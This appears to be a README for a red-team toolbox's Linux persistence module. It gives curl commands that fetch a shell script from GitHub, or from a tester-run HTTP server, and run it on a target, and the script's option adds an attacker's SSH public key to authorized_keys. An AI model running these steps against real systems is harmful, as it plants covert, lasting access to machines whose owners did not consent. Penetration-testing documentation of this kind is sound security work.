# Persistence Phase

Definition...  

Available parts:
- Modify SSH Keys

## Usage

```sh
# From github
curl -LJO https://github.com/McSquizzy/red-team-toolbox/blob/main/persistence/lin-persistence.sh
sh lin-persistence.sh -h
```
```sh
# Local network
# Host:
python -m SimpleHTTPServer 8000 #or
python3 -m http.server 8000
# Target:
curl -LJO <Host>:8000/lin-persistence.sh
sh lin-persistence.sh -h
```

### Parameters
```sh
sh lin-persistence.sh -h

Usage: sh lin-persistence.sh [-h] [-s]

-s <SSH public key>
  Trying to add ssh public key to authorized_keys
```

## Results

Results are output directly to the STDOUT.

## Compatibility

The script uses /bin/sh syntax and is fully POSIX compatible so can run on most unix-based (POSIX/Unix/Linux) systems. 